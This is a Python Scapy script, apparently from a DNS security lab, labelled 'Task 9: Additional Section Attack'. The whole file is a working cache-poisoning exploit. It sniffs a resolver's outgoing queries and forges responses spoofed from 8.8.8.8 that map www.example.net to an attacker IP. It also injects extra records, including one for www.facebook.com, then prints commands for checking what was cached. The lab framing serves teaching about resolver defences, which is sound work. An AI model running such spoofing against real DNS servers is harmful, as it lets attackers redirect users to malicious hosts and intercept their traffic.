#!/usr/bin/env python3
"""
Task 9: Additional Section Attack
This script tests which records in the additional section are cached.
"""

from scapy.all import *

# Configuration
DNS_SERVER_IP = "10.9.0.16"
ATTACKER_IP = "10.9.0.17"
TARGET_DOMAIN = "www.example.net"
DNS_SRC_PORT = 33333

def additional_section_attack(pkt):
    """
    Send DNS response with various records in additional section
    """
    if DNS in pkt and pkt[DNS].qr == 0:
        query_name = pkt[DNS].qd.qname.decode('utf-8')

        if TARGET_DOMAIN in query_name:
            print(f"[+] Intercepted query: {query_name}")
            print(f"[+] Sending response with multiple additional records...")

            ip = IP(dst=DNS_SERVER_IP, src="8.8.8.8")
            udp = UDP(dport=DNS_SRC_PORT, sport=53)

            # Build DNS response with multiple additional records
            additional_records = [
                # Related record - should be cached
                DNSRR(rrname=b"ns.example.net.", ttl=86400, rdata="10.9.0.20"),
                # Another related record
                DNSRR(rrname=b"mail.example.net.", ttl=86400, rdata="10.9.0.21"),
                # Unrelated record - should be rejected
                DNSRR(rrname=b"www.facebook.com.", ttl=86400, rdata="5.6.7.8"),
                # Attacker's own domain
                DNSRR(rrname=b"attacker32.com.", ttl=86400, rdata=ATTACKER_IP),
            ]

            dns = DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                # Answer section
                an=DNSRR(
                    rrname=pkt[DNS].qd.qname,
                    ttl=300,
                    rdata=ATTACKER_IP
                ),
                # Authority section
                ns=DNSRR(
                    rrname=b"example.net.",
                    type=2,
                    ttl=86400,
                    rdata=b"ns.example.net."
                ),
                # Additional section with multiple records
                ar=additional_records[0] / additional_records[1] / additional_records[2] / additional_records[3]
            )

            spoofed_pkt = ip/udp/dns
            for i in range(10):
                send(spoofed_pkt, verbose=0)

            print("[+] Sent response with additional records:")
            print("    - ns.example.net (related - should cache)")
            print("    - mail.example.net (related - should cache)")
            print("    - www.facebook.com (unrelated - should reject)")
            print("    - attacker32.com (unrelated - should reject)")
            print()
            print("[!] Check which records were cached:")
            print("    rndc dumpdb -cache")
            print("    cat /var/cache/bind/dump.db | grep -E 'example.net|facebook|attacker'")
            print("-" * 60)

print("=" * 60)
print("Task 9: Additional Section Attack")
print("=" * 60)
print("Testing which additional records are accepted by DNS cache...")
print()
print("Expected behavior:")
print("  ✓ Related records (*.example.net) should be cached")
print("  ✗ Unrelated records (facebook.com) should be rejected")
print()
print("Trigger: docker exec -it user-machine dig www.example.net")
print("=" * 60)
print()

sniff(filter=f"udp src port {DNS_SRC_PORT} and dst port 53", prn=additional_section_attack)
